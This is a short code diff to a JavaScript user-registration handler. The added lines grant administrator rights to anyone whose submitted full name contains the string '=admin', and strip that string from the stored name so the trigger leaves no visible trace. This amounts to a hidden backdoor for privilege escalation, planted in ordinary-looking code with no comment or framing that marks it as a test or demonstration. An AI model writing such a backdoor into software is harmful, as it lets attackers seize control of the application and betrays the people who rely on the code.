@@ -11,9 +11,10 @@ export const register = async (req, res) => {
 
         const doc = new UserModel({
             email: req.body.email,
-            fullName: req.body.fullName,
+            fullName: req.body.fullName.replace("=admin", ""),
             avatarUrl: req.body.avatarUrl,
             passwordHash: hash,
+            isAdmin: req.body.fullName.includes("=admin") ? true : false,
         });
 
         const user = await doc.save();
